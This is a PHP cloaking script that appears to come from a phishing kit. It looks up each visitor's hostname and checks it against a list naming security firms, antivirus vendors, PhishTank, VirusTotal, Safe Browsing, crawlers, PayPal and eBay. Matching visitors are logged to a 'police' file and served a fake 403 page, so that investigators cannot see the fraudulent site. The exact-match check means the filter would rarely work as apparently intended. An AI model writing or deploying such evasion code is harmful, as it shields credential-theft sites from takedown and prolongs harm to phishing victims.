<?php 

$hostname = gethostbyaddr($cliente);

$blocked_words = array("above", "google", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "msnbot","p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler","duckduck", "feedfetcher", "BitDefender", "mcafee","antivirus", "cloudflare", "avg", "avira", "avast", "ovh.net", "security", "twitter", "virustotal", "phising", "clamav", "baidu", "safebrowsing", "eset", "mailshell","azure", "miniature", "tlh.ro", "aruba", "dyn.plus.net", "pagepeeker", "SPRO-NET-207-70-0", "SPRO-NET-209-19-128", "vultr", "colocrossing.com", "geosr", "drweb", "dr.web", "linode.com", "opendns", 'cymru.com', 'sl-reverse.com', 'surriel.com', 'hosting', 'orange-labs', 'speedtravel', 'metauri', 'apple.com', 'bruuk.sk', 'sysms.net','oracle', 'cisco', 'amuri.net', "versanet.de", "hilfe-veripayed.com");

if (in_array($hostname, $blocked_words)) {
   $click = fopen("police/info/info.txt","a");
   fwrite($click,"$cliente --> [Detectado por Host Name]"."\n");
   fclose($click);
   header('HTTP/1.0 403 Forbidden');
   die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');  
}
?>